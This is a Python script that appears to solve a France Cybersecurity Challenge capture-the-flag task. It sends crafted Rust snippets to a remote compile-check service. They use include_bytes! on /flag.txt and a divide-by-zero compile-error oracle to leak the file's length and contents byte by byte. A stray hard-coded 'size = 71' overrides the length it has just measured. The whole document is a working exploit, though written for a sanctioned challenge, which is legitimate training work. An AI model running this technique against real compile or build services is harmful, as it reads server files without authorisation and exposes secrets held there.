#!/usr/bin/env python3.8
import json
import string
import sys
import urllib.request

url_base = "http://challenges2.france-cybersecurity-challenge.fr:6005/check"
COMPILE_SUCCESS = '{"result":0}'
COMPILE_FAILURE = '{"result":1}'

def get_size() -> int:
    size = 0
    while 1:
        data = {"content":"let my_string : &[u8; "+str(size)+"] = include_bytes!(\"/flag.txt\");"}
        jsonbytes = json.dumps(data).encode()

        req = urllib.request.Request(url_base)
        req.add_header('Content-Type', 'application/json')
        req.add_header('Content-Length', len(jsonbytes))

        response = urllib.request.urlopen(req, jsonbytes)
        html = response.read().decode()

        print(f"size={size}\r", end='')

        if COMPILE_SUCCESS in html:
            print()
            return size
        elif COMPILE_FAILURE in html:
            size += 1
        else:
            print(html)
            exit()

def get_flag(size: int) -> int:
    flag = ""
    for i in range(size-1):
        for c in string.printable:
            data = {"content": "const VALUE: i8 = 1 / (include_bytes!(\"/flag.txt\")["+str(i)+"] as i8 - b'"+c+"' as i8);"}
            jsonbytes = json.dumps(data).encode()

            req = urllib.request.Request(url_base)
            req.add_header('Content-Type', 'application/json')
            req.add_header('Content-Length', len(jsonbytes))

            response = urllib.request.urlopen(req, jsonbytes)
            html = response.read().decode()

            print(f"flag={flag}{c}\r", end='')

            if COMPILE_SUCCESS in html:
                continue
            elif COMPILE_FAILURE in html:
                flag += c
                break
            else:
                print(html)
                exit()
    print()
    return flag


size = get_size()
print(f"size={size}")

size = 71
flag = get_flag(size)
print(f"flag={flag}")
